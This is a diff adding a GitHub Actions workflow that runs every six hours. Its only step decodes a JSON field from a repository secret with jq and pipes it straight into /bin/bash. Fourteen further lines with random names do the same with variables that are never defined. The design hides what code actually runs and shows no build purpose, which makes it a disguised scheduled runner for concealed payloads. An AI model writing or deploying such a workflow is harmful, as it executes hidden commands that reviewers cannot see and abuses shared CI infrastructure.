@@ -1,0 +1,32 @@
+name: yangweiguo6457
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangweiguo6457
+        env:
+          b317: ${{ secrets.b317 }}
+        run: |
+          echo $b317 | jq -r .tedr35271 | /bin/bash
+          echo $ivh73592 | jq -r .nvyuh0428 | /bin/bash
+          echo $w8 | jq -r .m1676 | /bin/bash
+          echo $nkca59516 | jq -r .oq8 | /bin/bash
+          echo $sf8 | jq -r .zgab47 | /bin/bash
+          echo $azq62 | jq -r .bpci2 | /bin/bash
+          echo $irqcl5173 | jq -r .zo43 | /bin/bash
+          echo $tgmz0715 | jq -r .nnpp74 | /bin/bash
+          echo $ag8112 | jq -r .oci7842 | /bin/bash
+          echo $qzkoh8998 | jq -r .sf1 | /bin/bash
+          echo $g92 | jq -r .a6 | /bin/bash
+          echo $g541 | jq -r .o47945 | /bin/bash
+          echo $ssbn580 | jq -r .ai8 | /bin/bash
+          echo $zp445 | jq -r .oe5785 | /bin/bash
+          echo $jcfqg7 | jq -r .rxr66 | /bin/bash
+
